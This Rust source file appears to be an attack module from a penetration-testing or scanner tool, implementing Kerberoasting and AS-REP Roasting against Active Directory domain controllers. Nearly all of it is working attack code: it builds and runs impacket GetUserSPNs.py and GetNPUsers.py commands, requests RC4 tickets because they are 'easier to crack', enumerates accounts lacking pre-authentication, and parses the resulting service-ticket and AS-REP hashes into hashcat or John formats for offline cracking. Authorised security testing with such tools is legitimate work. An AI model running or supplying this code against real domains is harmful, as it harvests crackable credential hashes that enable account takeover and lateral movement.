// Kerberos Attack Module
// Implements Kerberoasting and AS-REP Roasting attacks using impacket tools

use crate::scanner::exploitation::types::*;
use anyhow::Result;
use chrono::Utc;
use log::{debug, info, warn};
use tokio::process::Command;
use std::time::Duration;

/// Run Kerberoasting attack to extract TGS tickets
/// Uses impacket's GetUserSPNs.py for real TGS ticket extraction
pub async fn run_kerberoast(config: &KerberoastConfig) -> Result<Vec<KerberoastResult>> {
    info!(
        "Running Kerberoast against DC {} in domain {}",
        config.domain_controller, config.domain
    );

    // Check for impacket's GetUserSPNs.py
    let impacket_check = Command::new("which")
        .arg("GetUserSPNs.py")
        .output()
        .await;

    if impacket_check.is_ok() && impacket_check.as_ref().unwrap().status.success() {
        return run_impacket_kerberoast(config).await;
    }

    // Check for impacket via python module
    let python_check = Command::new("python3")
        .args(["-c", "from impacket.examples import GetUserSPNs"])
        .output()
        .await;

    if python_check.is_ok() && python_check.as_ref().unwrap().status.success() {
        return run_python_kerberoast(config).await;
    }

    warn!("Impacket not found - install with: pip install impacket");
    Err(anyhow::anyhow!("Impacket not installed. Install with: pip install impacket"))
}

/// Run Kerberoasting using GetUserSPNs.py
async fn run_impacket_kerberoast(config: &KerberoastConfig) -> Result<Vec<KerberoastResult>> {
    // Build credentials string
    let creds = if let Some(ref password) = config.password {
        format!("{}/{}:{}", config.domain, config.username, password)
    } else if let Some(ref ntlm_hash) = config.ntlm_hash {
        format!("{}/{}:{}", config.domain, config.username, ntlm_hash)
    } else {
        return Err(anyhow::anyhow!("Password or NTLM hash required"));
    };

    let mut args = vec![
        creds,
        "-dc-ip".to_string(),
        config.domain_controller.clone(),
        "-request".to_string(),
    ];

    // Add specific SPNs if provided
    if let Some(ref target_spns) = config.target_spns {
        for spn in target_spns {
            args.push("-target".to_string());
            args.push(spn.clone());
        }
    }

    // Request RC4 if configured (easier to crack)
    if config.request_rc4 {
        args.push("-rc4".to_string());
    }

    // Output format
    match config.output_format {
        HashFormat::Hashcat => args.push("-outputfile=/tmp/kerberoast_hashes.txt".to_string()),
        HashFormat::John => {
            args.push("-outputfile=/tmp/kerberoast_hashes.txt".to_string());
            // Note: impacket outputs hashcat format by default
        }
    }

    let result = tokio::time::timeout(
        Duration::from_secs(120),
        Command::new("GetUserSPNs.py")
            .args(&args)
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            if combined.contains("error") && combined.to_lowercase().contains("kdc") {
                return Err(anyhow::anyhow!("KDC connection error: {}", combined));
            }

            parse_kerberoast_output(&combined, &config.output_format, config.request_rc4).await
        }
        Ok(Err(e)) => Err(anyhow::anyhow!("Failed to execute GetUserSPNs.py: {}", e)),
        Err(_) => Err(anyhow::anyhow!("Kerberoast timeout")),
    }
}

/// Run Kerberoasting via Python module
async fn run_python_kerberoast(config: &KerberoastConfig) -> Result<Vec<KerberoastResult>> {
    let creds = if let Some(ref password) = config.password {
        format!("{}/{}:{}", config.domain, config.username, password)
    } else if let Some(ref ntlm_hash) = config.ntlm_hash {
        format!("{}/{}@{}", config.domain, config.username, ntlm_hash)
    } else {
        return Err(anyhow::anyhow!("Password or NTLM hash required"));
    };

    let mut cmd_args = format!(
        "from impacket.examples.GetUserSPNs import main; main(['{}'",
        creds
    );
    cmd_args.push_str(&format!(", '-dc-ip', '{}'", config.domain_controller));
    cmd_args.push_str(", '-request'");
    if config.request_rc4 {
        cmd_args.push_str(", '-rc4'");
    }
    cmd_args.push_str("])");

    let result = tokio::time::timeout(
        Duration::from_secs(120),
        Command::new("python3")
            .args(["-c", &cmd_args])
            .output()
    ).await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            parse_kerberoast_output(&stdout, &config.output_format, config.request_rc4).await
        }
        Ok(Err(e)) => Err(anyhow::anyhow!("Failed to run Python: {}", e)),
        Err(_) => Err(anyhow::anyhow!("Kerberoast timeout")),
    }
}

/// Parse Kerberoast output and extract hashes
async fn parse_kerberoast_output(
    output: &str,
    format: &HashFormat,
    request_rc4: bool,
) -> Result<Vec<KerberoastResult>> {
    let mut results = Vec::new();

    // Also try to read from the output file
    if let Ok(file_content) = tokio::fs::read_to_string("/tmp/kerberoast_hashes.txt").await {
        for line in file_content.lines() {
            if line.starts_with("$krb5tgs$") {
                if let Some(result) = parse_tgs_hash_line(line, format, request_rc4) {
                    results.push(result);
                }
            }
        }
        let _ = tokio::fs::remove_file("/tmp/kerberoast_hashes.txt").await;
    }

    // Parse inline hashes from stdout
    for line in output.lines() {
        if line.starts_with("$krb5tgs$") {
            if let Some(result) = parse_tgs_hash_line(line, format, request_rc4) {
                // Avoid duplicates
                if !results.iter().any(|r: &KerberoastResult| r.hash == result.hash) {
                    results.push(result);
                }
            }
        }
    }

    // Parse SPN information from the table output
    // Format: ServicePrincipalName    Name    MemberOf    PasswordLastSet
    for line in output.lines() {
        if line.contains("/") && !line.starts_with("$") && !line.contains("Impacket") {
            // Try to extract SPN from table format
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 && parts[0].contains("/") {
                debug!("Found SPN in output: {}", parts[0]);
            }
        }
    }

    if results.is_empty() && !output.contains("No entries found") {
        info!("Kerberoast completed - output:\n{}", output.chars().take(500).collect::<String>());
    }

    Ok(results)
}

/// Parse a single TGS hash line
fn parse_tgs_hash_line(line: &str, format: &HashFormat, _request_rc4: bool) -> Option<KerberoastResult> {
    // Format: $krb5tgs$23$*user$realm$spn*$hash...
    // or: $krb5tgs$18$*user$realm$spn*$hash... (AES)

    if !line.starts_with("$krb5tgs$") {
        return None;
    }

    let encryption_type = if line.contains("$krb5tgs$23$") {
        "RC4-HMAC"
    } else if line.contains("$krb5tgs$18$") {
        "AES256-CTS-HMAC-SHA1-96"
    } else if line.contains("$krb5tgs$17$") {
        "AES128-CTS-HMAC-SHA1-96"
    } else {
        "Unknown"
    };

    // Extract SPN and username from hash
    let (username, spn) = extract_info_from_tgs_hash(line);

    Some(KerberoastResult {
        spn,
        username,
        hash: line.to_string(),
        hash_format: format.clone(),
        encryption_type: encryption_type.to_string(),
        crackable: encryption_type == "RC4-HMAC", // RC4 is easier to crack
        timestamp: Utc::now(),
    })
}

/// Extract username and SPN from TGS hash
fn extract_info_from_tgs_hash(hash: &str) -> (String, String) {
    // $krb5tgs$23$*username$REALM$spn*$...
    if let Some(start) = hash.find("$*") {
        if let Some(end) = hash[start+2..].find("*$") {
            let info = &hash[start+2..start+2+end];
            let parts: Vec<&str> = info.split('$').collect();
            if parts.len() >= 3 {
                return (parts[0].to_string(), parts[2].to_string());
            }
        }
    }
    ("unknown".to_string(), "unknown".to_string())
}

/// Run AS-REP Roasting attack to extract hashes from accounts without pre-auth
/// Uses impacket's GetNPUsers.py for real AS-REP hash extraction
pub async fn run_asrep_roast(config: &AsrepRoastConfig) -> Result<Vec<AsrepRoastResult>> {
    info!(
        "Running AS-REP Roast against DC {} in domain {}",
        config.domain_controller, config.domain
    );

    // Check for impacket's GetNPUsers.py
    let impacket_check = Command::new("which")
        .arg("GetNPUsers.py")
        .output()
        .await;

    if impacket_check.is_ok() && impacket_check.as_ref().unwrap().status.success() {
        return run_impacket_asrep(config).await;
    }

    warn!("Impacket GetNPUsers.py not found - install with: pip install impacket");
    Err(anyhow::anyhow!("Impacket not installed. Install with: pip install impacket"))
}

/// Run AS-REP Roasting using GetNPUsers.py
async fn run_impacket_asrep(config: &AsrepRoastConfig) -> Result<Vec<AsrepRoastResult>> {
    let mut args = vec![
        format!("{}/", config.domain),
        "-dc-ip".to_string(),
        config.domain_controller.clone(),
        "-format".to_string(),
        match config.output_format {
            HashFormat::Hashcat => "hashcat".to_string(),
            HashFormat::John => "john".to_string(),
        },
        "-outputfile".to_string(),
        "/tmp/asrep_hashes.txt".to_string(),
    ];

    // If we have usernames, use -usersfile
    if !config.usernames.is_empty() {
        // Write usernames to temp file
        let users_file = "/tmp/asrep_users.txt";
        let users_content = config.usernames.join("\n");
        tokio::fs::write(users_file, &users_content).await?;
        args.push("-usersfile".to_string());
        args.push(users_file.to_string());
    }

    // Request mode - no creds needed for AS-REP roasting
    args.push("-request".to_string());

    // If enumeration is enabled, don't provide userlist
    if config.enumerate_users && config.usernames.is_empty() {
        args.push("-no-pass".to_string());
    }

    let result = tokio::time::timeout(
        Duration::from_secs(120),
        Command::new("GetNPUsers.py")
            .args(&args)
            .output()
    ).await;

    // Cleanup temp files
    let _ = tokio::fs::remove_file("/tmp/asrep_users.txt").await;

    match result {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = format!("{}{}", stdout, stderr);

            if combined.to_lowercase().contains("error") && combined.to_lowercase().contains("kdc") {
                return Err(anyhow::anyhow!("KDC connection error: {}", combined));
            }

            parse_asrep_output(&combined, &config.output_format, &config.domain).await
        }
        Ok(Err(e)) => Err(anyhow::anyhow!("Failed to execute GetNPUsers.py: {}", e)),
        Err(_) => Err(anyhow::anyhow!("AS-REP Roast timeout")),
    }
}

/// Parse AS-REP Roasting output and extract hashes
async fn parse_asrep_output(
    output: &str,
    format: &HashFormat,
    _domain: &str,
) -> Result<Vec<AsrepRoastResult>> {
    let mut results = Vec::new();

    // Try to read from output file first
    if let Ok(file_content) = tokio::fs::read_to_string("/tmp/asrep_hashes.txt").await {
        for line in file_content.lines() {
            if line.starts_with("$krb5asrep$") {
                if let Some(result) = parse_asrep_hash_line(line, format) {
                    results.push(result);
                }
            }
        }
        let _ = tokio::fs::remove_file("/tmp/asrep_hashes.txt").await;
    }

    // Also parse inline hashes from stdout
    for line in output.lines() {
        if line.starts_with("$krb5asrep$") {
            if let Some(result) = parse_asrep_hash_line(line, format) {
                // Avoid duplicates
                if !results.iter().any(|r: &AsrepRoastResult| r.hash == result.hash) {
                    results.push(result);
                }
            }
        }
    }

    // Log users that have pre-auth required (not vulnerable)
    for line in output.lines() {
        if line.contains("doesn't have UF_DONT_REQUIRE_PREAUTH") ||
           line.contains("KDC_ERR_PREAUTH_REQUIRED") {
            debug!("User requires pre-auth (not vulnerable): {}", line);
        }
    }

    if results.is_empty() && !output.contains("No entries found") {
        info!("AS-REP Roast completed - output:\n{}", output.chars().take(500).collect::<String>());
    }

    Ok(results)
}

/// Parse a single AS-REP hash line
fn parse_asrep_hash_line(line: &str, format: &HashFormat) -> Option<AsrepRoastResult> {
    // Format: $krb5asrep$23$user@DOMAIN:hash...
    if !line.starts_with("$krb5asrep$") {
        return None;
    }

    // Extract username from hash
    let username = extract_username_from_asrep_hash(line);

    Some(AsrepRoastResult {
        username,
        hash: line.to_string(),
        hash_format: format.clone(),
        timestamp: Utc::now(),
    })
}

/// Extract username from AS-REP hash
fn extract_username_from_asrep_hash(hash: &str) -> String {
    // $krb5asrep$23$username@DOMAIN:hash...
    if let Some(start) = hash.find("$23$") {
        let rest = &hash[start+4..];
        if let Some(at_pos) = rest.find('@') {
            return rest[..at_pos].to_string();
        }
        if let Some(colon_pos) = rest.find(':') {
            return rest[..colon_pos].to_string();
        }
    }
    "unknown".to_string()
}

/// Extract username from SPN (e.g., MSSQLSvc/server.domain.com:1433 -> MSSQLSvc)
#[allow(dead_code)]
fn extract_username_from_spn(spn: &str) -> String {
    if let Some(slash_pos) = spn.find('/') {
        spn[..slash_pos].to_string()
    } else {
        spn.to_string()
    }
}

/// Check if a user requires Kerberos pre-authentication using AS-REQ
#[allow(dead_code)]
async fn check_preauth_required(dc: &str, domain: &str, username: &str) -> bool {
    // Use GetNPUsers.py to check a single user
    let result = Command::new("GetNPUsers.py")
        .args([
            &format!("{}/{}", domain, username),
            "-dc-ip",
            dc,
            "-no-pass",
            "-request",
        ])
        .output()
        .await;

    match result {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            // If we get a hash, user is vulnerable
            stdout.contains("$krb5asrep$")
        }
        Err(_) => false,
    }
}

/// Enumerate SPNs from Active Directory via LDAP using ldapsearch or impacket
#[allow(dead_code)]
pub async fn enumerate_spns(
    dc: &str,
    domain: &str,
    username: &str,
    password: Option<&str>,
    _ntlm_hash: Option<&str>,
) -> Result<Vec<String>> {
    info!("Enumerating SPNs from {} in domain {}", dc, domain);

    // Try GetUserSPNs.py without -request to just enumerate
    if let Some(pass) = password {
        let creds = format!("{}/{}:{}", domain, username, pass);
        let result = Command::new("GetUserSPNs.py")
            .args([&creds, "-dc-ip", dc])
            .output()
            .await;

        if let Ok(output) = result {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let mut spns = Vec::new();

            for line in stdout.lines() {
                // Parse table output: SPN    Name    MemberOf
                if line.contains("/") && !line.starts_with("$") && !line.contains("Impacket") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if !parts.is_empty() && parts[0].contains("/") {
                        spns.push(parts[0].to_string());
                    }
                }
            }
            return Ok(spns);
        }
    }

    warn!("SPN enumeration requires valid credentials");
    Ok(Vec::new())
}

/// Enumerate users without Kerberos pre-authentication using GetNPUsers.py
#[allow(dead_code)]
pub async fn enumerate_asrep_users(
    dc: &str,
    domain: &str,
    _username: &str,
    _password: Option<&str>,
) -> Result<Vec<String>> {
    info!(
        "Enumerating users without pre-auth from {} in domain {}",
        dc, domain
    );

    // GetNPUsers.py with no creds can enumerate vulnerable users
    let result = Command::new("GetNPUsers.py")
        .args([&format!("{}/", domain), "-dc-ip", dc, "-no-pass", "-request"])
        .output()
        .await;

    if let Ok(output) = result {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut users = Vec::new();

        for line in stdout.lines() {
            if line.starts_with("$krb5asrep$") {
                let username = extract_username_from_asrep_hash(line);
                if username != "unknown" {
                    users.push(username);
                }
            }
        }
        return Ok(users);
    }

    warn!("AS-REP user enumeration failed");
    Ok(Vec::new())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_username_from_spn() {
        assert_eq!(
            extract_username_from_spn("MSSQLSvc/server.domain.com:1433"),
            "MSSQLSvc"
        );
        assert_eq!(
            extract_username_from_spn("HTTP/webserver.domain.com"),
            "HTTP"
        );
        assert_eq!(extract_username_from_spn("service"), "service");
    }

    #[test]
    fn test_extract_tgs_hash_info() {
        let hash = "$krb5tgs$23$*sqlsvc$DOMAIN.COM$MSSQLSvc/db.domain.com*$abc123";
        let (username, spn) = extract_info_from_tgs_hash(hash);
        assert_eq!(username, "sqlsvc");
        assert_eq!(spn, "MSSQLSvc/db.domain.com");
    }

    #[test]
    fn test_extract_asrep_username() {
        let hash = "$krb5asrep$23$testuser@DOMAIN.COM:abc123def456";
        let username = extract_username_from_asrep_hash(hash);
        assert_eq!(username, "testuser");
    }
}
